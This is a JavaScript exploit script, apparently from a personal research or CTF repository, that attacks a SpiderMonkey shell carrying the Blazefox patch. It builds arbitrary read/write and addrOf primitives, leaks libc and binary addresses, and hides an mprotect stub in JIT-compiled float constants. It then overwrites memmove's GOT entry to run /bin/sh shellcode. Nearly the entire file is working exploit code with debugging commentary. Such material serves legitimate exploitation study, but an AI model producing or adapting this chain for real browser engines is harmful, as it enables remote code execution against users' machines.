// this exploit is for the Spidermonkey shell built with the Blazefox patch
// this exploit builds upon the first blazefox exploit in this repo by
// using a JIT code reuse method to execute shellcode, instead of just
// calling something like /bin/sh or xcalc. This is a big improvement,
// since JIT code reuse allows for native code execution instead of relying
// on calling something on the target with system()
// I've drawn ideas and code snippets from several sources, including:
// https://blog.infosectcbr.com.au/2020/01/firefox-spidermonkey-js-engine.html
// https://doar-e.github.io/blog/2018/11/19/introduction-to-spidermonkey-exploitation/

// these paths are relative to the Spidermonkey shell location
// these are Saelo's libraries
load('../../../../../../utils.js');
load('../../../../../../int64.js');

const Address = Math.atan2; // use for setting an easy breakpoint on js::math_atan2

// addr_to_read can be passed as a hex value, e.g. 0x41414141
// this function leaks a single byte at a time, so I use a for loop to leak a full qword
// a version that only reads a 32-bit value could be implemented by changing the for loop to be i = 3 instead of i = 7
function arb_read64(addr_to_read){

	function get_byte(addr_to_read,target_byte){
		var saved_pointer = blz[13]; // back up the pointer so it can be restored later
		address = new Int64(addr_to_read); // comes from Saelo's libraries

		// now overwrite the backing store buffer
		blz[13] = address.asDouble(); // comes from Saelo's libraries

		// view the contents of the typed array
		leak = target[target_byte];

		blz[13] = saved_pointer; // restore the overwritten backing store pointer
		return leak;
	}

	// use a for loop to extract every byte
	// there's almost certainly a more elegant solution than this, but it works
	var i;
	var final_leak = "";
	for(i = 7; i >= 0; i--){
		leaked_byte = get_byte(addr_to_read,i);
		// uncomment below to see each byte you're leaking individually
		//console.log("The leaked byte is", leaked_byte);
		final_leak += leaked_byte.toString(16);
	}
	return final_leak;
}

// also only writes one byte at a time, hence the for loop
function arb_write(target_addr,value_to_write){

	function write_byte(target_addr, to_write, target_byte){
        var saved_pointer = blz[13];
        address = new Int64(target_addr); // comes from Saelo's libraries

        // now overwrite the backing store buffer
		blz[13] = address.asDouble(); // comes from Saelo's libraries
		
        // write to the targeted address
        target[target_byte] = to_write;

		blz[13] = saved_pointer; // restore the overwritten backing store pointer
	}

	var bytes = 18;
	var i;
	var target_byte = 0;

	// again, there must be a cleaner way to do this
	for(i = 0; i <= 7; i++){
		next_byte = value_to_write.toString(16).slice(2,bytes);
		//uncomment below to see each byte you're overwriting individually
		//console.log("The next byte is", next_byte);
		bytes -= 2;
		to_write = parseInt(next_byte,16);
		//uncomment below to see each byte you're writing individually
		//console.log("The value to write is", to_write);
		write_byte(target_addr,to_write,target_byte);
		target_byte += 1;
	}
}

function addrOf_primitive(target_object){

// index 14 is one qword past the backing store pointer, which should be the actual backing store
blz[14] = target_object; // overwrite the backing store of the typed array past the vulnerable object

// uncomment below lines for debug info
//console.log(objectAddress(target));
//Address(blz);

//console.log(target.slice(0,8)); // this outputs the 6 bytes for the object plus the two for the jsval nan-box
//console.log(objectAddress(test_array));

// now try reading from the backing store and reassembling it into a JSVal
var i;
var jsval = "";

// the two most significant bytes will be the NaN-boxed values, so just don't include them
for(i = 5; i >= 0; i--){

	// leading zeros get dropped by the toString function, so
	// check the range of 0-15 and add a 0 if the number falls within that range
	// without this, the addresses that get leaked are wrong (e.g. dropping leading zeros yields 0x007ffff61580 instead of 0x7ffff6150800)
	if(target.slice(0,8)[i] <= 15){
		jsval += "0" + (target.slice(0,8)[i]).toString(16);
		continue;
	}
	jsval += (target.slice(0,8)[i]).toString(16);
}

// uncomment the below lines for more debug info
//console.log("The extracted jsval is 0x" + jsval);
//console.log(parseInt(jsval,16))

// return the object address in numeric form
return parseInt(jsval,16);
}

console.log("[*] STAGE 1: Use initial OOB access to gain arbitrary r/w");

var blz = new Array(1.1,2.2,3.3); // has to be declared like this instead of var blz = [...] in order to be allocated contiguously with the typed array. I don't know why
var target = new Uint8Array(8);
target[0] = 0x41;
target[1] = 0x42;
target[2] = 0x43;
target[4] = 0x44;
// fill out the buffer; this is useful if the raw memory buffer is going to be written to at some point
target[5] = 0x45;
target[6] = 0x46;
target[7] = 0x47;

// these are useful for debugging, but not necessary; they'll just print out the addresses of the object
//console.log(objectAddress(blz));
//console.log(objectAddress(target));

blz.blaze(); // now use the vulnerability to extend the length field of the array to 420 indices
backing_store_pointer = Int64.fromDouble(blz[13]); // this is the pointer to the backing store buffer
elements_text_pointer = Int64.fromDouble(blz[9]); // should be the elements_ pointer of the typed array; use to figure out base of binary by leaking .text address
native_function_pointer = elements_text_pointer - 16; // the elements_pointer is 16 bytes into a native function, which is why I'm subtracting 16 here

// offset between the native function pointer and the image base is 0xadf650
image_base = native_function_pointer - 0xadf650;

// now calculate the addresses of the target GOT entries
gettimeofday_got = image_base + 0x181b518;
fopen_got = image_base + 0x181b068;
memmove_got = image_base + 0x181b128;

libc_leak = arb_read64(fopen_got);

console.log("---------------------------------------------------");
console.log("[*] LEAKS:");

console.log("The final libc leak string is 0x" + libc_leak);
numeric_libc_leak = parseInt(libc_leak,16); // turn this into an int to do some math

// offset from fopen() to system() is - 0x2f3d0
system_libc = numeric_libc_leak - 0x2f3d0
converted_system = new Int64(system_libc);

// output all the calculations
console.log("Backing store pointer is", backing_store_pointer);
console.log("The elements_ pointer of the typed array is", elements_text_pointer);
console.log("emptyElementsHeader() is 0x" + native_function_pointer.toString(16));
console.log("Image base is 0x" + image_base.toString(16));
console.log("gettimeofday's GOT entry is 0x" + gettimeofday_got.toString(16));
console.log("fopen's GOT entry is 0x" + fopen_got.toString(16));
console.log("The libc address of system() is 0x" + system_libc.toString(16));
console.log("memmove()'s GOT entry is 0x" + memmove_got.toString(16));

console.log("---------------------------------------------------");


// We're going to move the arb r/w from the more volatile array and Typed Array in the nursery heap
// to ArrayBuffers, which will be placed on the tenured heap right away and should stay there
// use the addrOf primitive to find out where they are, then 
// use the initial r/w to corrupt an ArrayBuffer's length field to start manipulating the second 
// ArrayBuffer

console.log("[*] STAGE 2: Use the arbitrary r/w to migrate to new primitives via ArrayBuffers, which are on the tenured heap and are less volatile");

// these will be allocated contiguously on the tenured heap
vuln_arraybuf = new ArrayBuffer(1);
r_w_arraybuf = new ArrayBuffer(1);

// now use the addrOf primitive to leak the addresses of the ArrayBuffers
leaked_vuln_arraybuf = addrOf_primitive(vuln_arraybuf);
leaked_r_w_arraybuf = addrOf_primitive(r_w_arraybuf);

console.log("The leaked vuln arraybuf is", leaked_vuln_arraybuf.toString(16));
console.log("The leaked r/w arraybuf is", leaked_r_w_arraybuf.toString(16));

// the BYTE_LENGTH_SLOT of an ArrayBuffer is located at an offset of ArrayBuffer + 0x28
// that's what we'll want to corrupt on the ArrayBuffers to provide OOB primitives
// don't forget that we need to write a NaN-boxed size, so it should start with 0xfff880
arraybuf_overwrite = new Int64(0xfff8800000100000)
arb_write((leaked_vuln_arraybuf + 0x28),arraybuf_overwrite);
arb_write((leaked_r_w_arraybuf + 0x28),arraybuf_overwrite);

// try using the corrupted size to write from a typed array view 
// over the second ArrayBuffer's backing store pointer
const vuln_arraybuf_view = new Uint8Array(vuln_arraybuf);

// it should now be possible to start performing r/w operations from the first
// ArrayBuffer into the second

//TODO: Organize these new exploit primitive functions better

// use this to modify the backing store pointer of the second ArrayBuffer
// this function can be followed up with a read, write, or addrOf primitive
// once it's changed, it should be possible to write into wherever it points (instead of just even numbers)
function prep_write_arraybuffer(target_addr){

	function write_byte(target_byte){

		vuln_arraybuf_view[target_byte] = to_write;
	}

	// I need to figure out how to deal with odd numbers, but for now I'll just leave it
	//if((target_addr % 2) != 0){
	//	console.log("The provided address is an odd number");
	//}

	var bytes = 18;
	var i;
	// we'll want to start at index 64, since we're writing from the size-corrupted first ArrayBuffer
	var target_byte = 64;

	for(i = 0; i <= 7; i++){
		next_byte = (RShift1(target_addr)).toString(16).slice(2,bytes);
		//uncomment below to see each byte you're overwriting individually
		//console.log("The next byte is", next_byte);
		bytes -= 2;
		to_write = parseInt(next_byte,16);
		//uncomment below to see each byte you're writing individually
		//console.log("The value to write is", to_write);
		write_byte(target_byte);
		target_byte += 1;
	}
}



// in this function, just before the loop I declare a temporary TypedArray that's a view
// into the second ArrayBuffer, which should allow me to write into it
function arb_write_arraybuffer(value_to_write){

	function write_byte(to_write, target_byte){

		// write to the targeted address that's held in the corrupted
		// backing store pointer of the second ArrayBuffer
        r_w_arraybuf_view[target_byte] = to_write;
	}

	// declare the Typed Array view we'll use for writing via the corrupted
	// second ArrayBuffer
	const r_w_arraybuf_view = new Uint8Array(r_w_arraybuf);

	var bytes = 18;
	var i;
	var target_byte = 0;

	// again, there must be a cleaner way to do this
	for(i = 0; i <= 7; i++){
		next_byte = value_to_write.toString(16).slice(2,bytes);
		//uncomment below to see each byte you're overwriting individually
		//console.log("The next byte is", next_byte);
		bytes -= 2;
		to_write = parseInt(next_byte,16);
		//uncomment below to see each byte you're writing individually
		//console.log("The value to write is", to_write);
		write_byte(to_write,target_byte);
		target_byte += 1;
	}
}

// now create a read primitive
// a good TODO would probably be to make the read primitive use the prep primitive to modify
// the backing store pointer, perform the read, and then restore everything
// as it is, I need to call each function individually in order, which is fine, but
// could be made sleeker
function arb_read_arraybuffer(jsval = 0){

	function get_byte(target_byte){

		// view the contents of the ArrayBuffer's corrupted backing store pointer
		leak = r_w_arraybuf_view[target_byte];
		return leak;
	}

	// declare the Typed Array view we'll use for reading via the corrupted
	// second ArrayBuffer
	const r_w_arraybuf_view = new Uint8Array(r_w_arraybuf);

	// use a for loop to extract every byte
	// there's almost certainly a more elegant solution than this, but it works
	var i;
	var final_leak = "";

	// only read 6 bytes if this is being used as an addrOf read, since the last two will be for NaN-boxing purposes
	if(jsval == 1){
		console.log("Reading a JSVal...");
		for(i = 5; i >= 0; i--){
			leaked_byte = get_byte(i);
			// uncomment below to see each byte you're leaking individually
			// console.log("The leaked byte is", leaked_byte);
			final_leak += leaked_byte.toString(16);
		}
		return final_leak;
	}

	for(i = 7; i >= 0; i--){

		leaked_byte = get_byte(i);

		// uncomment below to see each byte you're leaking individually
		//console.log("The leaked byte is", leaked_byte);

		// just like in the original addrOf primitive, the toString() conversion will drop leading zeros
		// to prevent that, check if it's a value that'll need it and prepend it manually
		if(leaked_byte <= 15){
			final_leak += ("0" + leaked_byte.toString(16));
			continue;
		}

		final_leak += leaked_byte.toString(16);
	}
	return final_leak;
}

function addrOf_arraybuffer_primitive(object_to_leak){	
	// set the object to leak as a property of the ArrayBuffer
	// this gets it placed into the area the ArrayBuffer's slots_ array points to
	r_w_arraybuf.object_to_leak = object_to_leak;
	// use the position of the slots_ pointer relative to the address of the ArrayBuffer
	var addressOfSlotsArray = (leaked_r_w_arraybuf + 16);

	// I could also implement pointer restoring for the prep function to make this cleaner
	// the pointer to the slots array needs to be deferenced twice to get to the object address
	// first, leak the pointer to the property
	prep_write_arraybuffer(addressOfSlotsArray);
	slots_leak = arb_read_arraybuffer();
	// now leak the JSVal itself
	prep_write_arraybuffer(slots_leak);

	// use the optional argument to tell arb_read_arraybuffer() to read a JSVal instead of a normal address
	addrOf_leak = arb_read_arraybuffer(1);
	return addrOf_leak;
}

console.log("[*] STAGE 3: With the r/w primitives migration complete, it's now time to gain code execution");

// convert some raw bytes in an array to a float representation
// this function will be useful when we JIT floats to output shellcode later on
function b2f(A) {
    if(A.length != 8) {
        throw 'Needs to be an 8 bytes long array';
    }

    const Bytes = new Uint8Array(A);
    const Doubles = new Float64Array(Bytes.buffer);
    return Doubles[0];
}

// use a TypedArray to hold shellcode in its backing store, then
// leak its address using the addrOf primitive. This is important for
// calling mprotect() later to mark the backing store as executable

const shellcode_size = 0x500;
const shellcode_buffer = new Uint8Array(shellcode_size);
var shellcode = [0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
0x50,0x48,0x31,0xd2,0x48,0x31,0xf6,0x48,0xbb,0x2f,0x62,0x69,0x6e,0x2f,0x2f,0x73,0x68,0x53,0x54,0x5f,0xb0,0x3b,0x0f,0x05];
// above shellcode (minus the NOP sled) was obtained from here: https://www.exploit-db.com/exploits/42179
// it just calls /bin/sh

// write the shellcode into the TypedArray's backing store
for(i = 0; i < shellcode.length; i++){
	shellcode_buffer[i] = shellcode[i];
}

// calculate the address of the backing store, not just of the object
// First, use the addrOf primitive, then follow it up with an
// arbitrary read a little bit into the object to get the pointer to the backing store
console.log("Here's the shellcode_buffer address:");
shellcode_object_address = addrOf_arraybuffer_primitive(shellcode_buffer);
console.log(shellcode_object_address);

// convert the result to an int and then add 56 bytes, which is the offset from the start of the
// object to the pointer to the pointer to the shellcode (we'll need to dereference the first pointer to get the one we really want)
shellcode_offset = parseInt(shellcode_object_address, 16);
shellcode_offset = shellcode_offset + 56;
console.log("The pointer in the object to the shellcode pointer should be at", shellcode_offset);

prep_write_arraybuffer(shellcode_offset);
shellcode_pointer = arb_read_arraybuffer();
console.log("The shellcode pointer is", shellcode_pointer);

// now we have the pointer to the shellcode. The region of memory the shellcode is pointing to is currently r/w, so we'll
// want that pointer for later when we use JITed shellcode to call mprotect() on that region to mark it executable

// find the start of the memory page holding the shellcode. I think this will be important
// for calling mprotect()
shellcode_page = alignDownPage(shellcode_pointer);
console.log("The page holding the shellcode starts at", shellcode_page);

// let's output the shellcode we'll be using here, then plug the constants into the jit_shellcode function below
// let's start with controlling the registers for mprotect()
// relative jumps are necessary to execute all the shellcode, because it only gets JITed in 8-byte chunks as doubles
// first, clear the registers we need to control (rdi will already be controlled from the copyWithin() call)
// 0x48 0x31 0xf6 xor rsi, rsi
// 0x48 0x31 0xd2 xor rdx, rdx
// 0xeb 0x06 jmp 8
// next qword:
// 0x90 nop
// 0x48 0x31 0xc0 xor rax, rax
// 0xeb 0x06 jmp 8
console.log("Here are the constants for clearing the rsi, rdx, and rax registers");
// b2f converts from raw bytes to a float representation to be JITed
console.log(b2f([0x48,0x31,0xf6,0x48,0x31,0xd2,0xeb,0x06]));
console.log(b2f([0x90,0x90,0x90,0x48,0x31,0xc0,0xeb,0x06]));

// now get set up to & rdi with 0xfffffffffffff000 to get the page boundary for the shellcode into rdi
// the summary is that r8 holds the original rdi value, and then 0xfffffffffffff000 gets placed in rdi
// through a few steps (since doing it in one instruction is more than 8 bytes)
// then the new rdi value is &ed with the original rdi value in r8 in order to get the start of the shellcode
// page in rdi, which can then be used in the mprotect() syscall
// 0x4d 0x31 0xc0 xor r8, r8
// 0x49 0x31 0xf8 xor r8, rdi
// 0xeb 0x06 jmp 8
// next qword:
// 0x90 nop
// 0xbf 0xff 0xff 0xff 0xff mov edi, 0xffffffff
// 0xeb 0x06 jmp 8
// next qword:
// 0x90 nop
// 0x48 0xc1 0xcf 0x20 ror rdi, 20 (this moves the bytes into the upper half of rdi)
// 0xeb 0x06 jmp 8
// next qword:
// 0x90 nop
// 0x4d 0x31 0xc9 xor r9, r9
// 0xeb 0x06 jmp 8
// next qword:
// 0x41 0xb9 0x00 0xf0 0xff 0xff mov r9d, 0xfffff000
// 0xeb 0x06 jmp 8
// next qword:
// 0x4c 0x01 0xcf add rdi,r9
// 0x4c 0x21 0xc7 and rdi,r8
// 0xeb 0x06 jmp 8
console.log("Now here are the constants for clearing r8 and XORing rdi into it, then getting 0xfffffffffffff000 into rdi and &ing with r8 to get the shellcode page");
console.log(b2f([0x4d,0x31,0xc0,0x49,0x31,0xf8,0xeb,0x06]));
console.log(b2f([0x90,0xbf,0xff,0xff,0xff,0xff,0xeb,0x06]));
console.log(b2f([0x90,0x90,0x48,0xc1,0xcf,0x20,0xeb,0x06]));
console.log(b2f([0x90,0x90,0x90,0x4d,0x31,0xc9,0xeb,0x06]));
console.log(b2f([0x41,0xb9,0x00,0xf0,0xff,0xff,0xeb,0x06]));
console.log(b2f([0x4c,0x01,0xcf,0x4c,0x21,0xc7,0xeb,0x06]));


// the shellcode uses the smaller versions of the registers to keep instructions shorter
// 0x90 nop
// 0x66 0xbe 0xff 0x0f mov si, 0xfff (set up the size for the mprotect() call)
// 0xeb 0x06 jmp 8
// next qword:
// 0x90 nop
// 0xb2 0x07 mov dl, 0x7 (set the permissions for the mprotect() call)
// 0xb0 0x0a mov al, 0xa (set the syscall value to 10 to call mprotect())
// 0xeb 0x09 jmp 11 -- I need to jump a little further here for some reason
console.log("Here are the constant values for the register control shellcode");
console.log(b2f([0x90,0x90,0x66,0xbe,0xff,0x0f,0xeb,0x06]))
console.log(b2f([0x90,0x90,0xb2,0x07,0xb0,0x0a,0xeb,0x09]));

// syscall shellcode to be able to call mprotect()
// the original r8 value is moved back into rdi for the jump to the mprotect()ed shellcode
// 0x90 nop (repeated)
// 0x0f 0x05 syscall
// 0x4c 0x89 0xc7 mov rdi,r8
// 0xff 0xe7 jmp rdi
console.log("Here's the constant value for the syscall shellcode + jump to the mprotect()ed shellcode");
console.log(b2f([0x90,0x0f,0x05,0x4c,0x89,0xc7,0xff,0xe7]));

// use a unique pattern to mark the beginning of the JITed shellcode; we'll scan memory for this value
const shellcode_finder = 'startrop'.split('').map(c => c.charCodeAt(0));
console.log("The shellcode finder value is");
console.log(b2f(shellcode_finder));

// here's a function that assigns the constant output by the above b2f() calls to a bunch of variables
// this function can be JITed to get the mprotect() shellcode stub into executable memory
const jit_shellcode = function () {
	const start = 3.9057740116899203e+233; // the converted version of shellcode_finder
	const clear_rsi_rdx = 2.5111214609630683e-275;
	const clear_rax = 2.504775072349687e-275;
	// these steps are used to & rdi with 0xfffffffffffff000 to get the page boundary for the shellcode
	const get_page_boundary_1 = 2.5245193922165178e-275;
	const get_page_boundary_2 = 2.5272721262054717e-275;
	const get_page_boundary_3 = 2.4485810036920954e-275;
	const get_page_boundary_4 = 2.507948292488004e-275;
	const get_page_boundary_5 = 2.5272720401475934e-275;
	const get_page_boundary_6 = 2.5072210983030736e-275;
	// now set up the mprotect() syscall and then jump to the executable shellcode
	const mov_si = 2.4426532869242186e-275;
	const mov_dl_mov_al = 6.87018666988264e-261;
	const syscall_jump_to_shellcode = -9.061987630678911e+192;

	// uncomment below to see the exact iteration when the code gets JITed
	//if(inJit()){
	//	console.log("This code has been JITed");
	//}
	//else{
	//	console.log("Function not JITed yet, heating...");
	//}
};

// 12 invocations is enough to heat the function and trigger the baseline JIT compiler
for(let Idx = 0; Idx < 12; Idx++) {
    jit_shellcode();
}

console.log("DEBUG: The object address of jit_shellcode is:");
console.log(objectAddress(jit_shellcode));

// begin working through the calculations to arrive at the pointer to the JIT page
var jit_address = addrOf_arraybuffer_primitive(jit_shellcode);
console.log(jit_address);

// offet to the eventual JIT code pointer is function address + 0x30
jit_address = parseInt(jit_address,16) + 0x30
console.log("jit_address + 0x30 is", jit_address.toString(16));

// dereference the pointer once
prep_write_arraybuffer(jit_address);
jit_address = arb_read_arraybuffer();
console.log("The dereferenced jit_address is:")
console.log(jit_address);

// now dereference again to end up with the JIT page pointer
prep_write_arraybuffer(jit_address);
jit_address = arb_read_arraybuffer();
console.log("The final pointer to the JIT page is:");
console.log(jit_address);
console.log("And the start of that JIT page is:");

// now get the start of the JIT page for memory scanning
jit_page = alignDownPage(jit_address);
console.log(jit_page);

// convert jit_page to an int for the memory scanning step
jit_page = parseInt(jit_page,16);

// now begin scanning for the shellcode finder constant
// this will help mark the beginning of the shellcode in memory
var shellcode_marker;
for(i = 0; i < 0x2000; i++){
	needle = jit_page + i;
	//console.log("Scanning the address", needle.toString(16));
	prep_write_arraybuffer(needle);
	var scan = arb_read_arraybuffer();
	// check if the scanned value is equal to the decimal representation of the shellcode finder string
	// if so, we found the beginning of our shellcode in memory
	if(parseInt(scan,16) == 8101820099123573875){
		console.log("Needle found! The pointer to the shellcode finder is:");
		console.log(needle.toString(16));
		shellcode_marker = needle;
		break;
	}
}

// needle wasn't found, so shellcode_marker wasn't given a value
// there's no point continuing, since we don't know the location of the shellcode
if(!shellcode_marker){
	console.log("Needle not found! Bailing out...");
	throw '';
}

console.log("And the value of shellcode_marker is now", shellcode_marker);

// calculate the offset from the marker string to the beginning of the JITed shellcode
var start_of_shellcode = shellcode_marker + 14;
console.log("The shellcode begins at", start_of_shellcode.toString(16));


// hijack memmove()'s GOT entry to point to JITed shellcode and call it on
// the TypedArray holding the main shellcode so that RDI will point to it when calling mprotect()
// with the JITed shellcode stub
prep_write_arraybuffer(memmove_got);
console.log("overwriting memmove() with", start_of_shellcode);
start_of_shellcode = new Int64(start_of_shellcode);
arb_write_arraybuffer(start_of_shellcode);
console.log("memmove()'s GOT entry has been hijacked...");


console.log("Trying to get code exec...")
shellcode_buffer.copyWithin(0,1);
